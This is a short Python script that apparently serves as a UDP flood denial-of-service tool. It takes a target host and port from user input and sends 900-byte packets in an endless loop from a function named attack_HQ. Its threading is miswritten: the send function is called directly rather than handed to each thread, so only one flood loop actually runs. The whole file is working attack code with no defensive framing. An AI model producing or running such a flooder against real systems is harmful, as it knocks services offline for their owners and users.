import sys
import socket
import threading

print("Enter Input: ")
user_data = input()
host, port = user_data.split(' ')
port = int(port)

def send_packet(amplifier):
    try:
        print("Running......")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))

        while True:
            s.send(b"\x99" * amplifier)

    except Exception as e:
        print("ERROR ", e)
        return s.close()

def attack_HQ():
   threading.Thread(target=send_packet(900), daemon=True).start()
   threading.Thread(target=send_packet(900), daemon=True).start()

attack_HQ()
